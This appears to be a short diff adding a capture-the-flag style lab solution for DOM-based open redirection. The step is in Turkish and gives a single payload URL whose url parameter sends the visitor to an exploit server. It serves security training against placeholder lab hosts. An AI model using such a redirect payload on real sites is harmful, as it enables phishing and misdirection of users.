@@ -1,0 +1,4 @@
+LAB: DOM-based open redirection
+
+1 - Aşağıdaki payloada tıklayın.
+https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
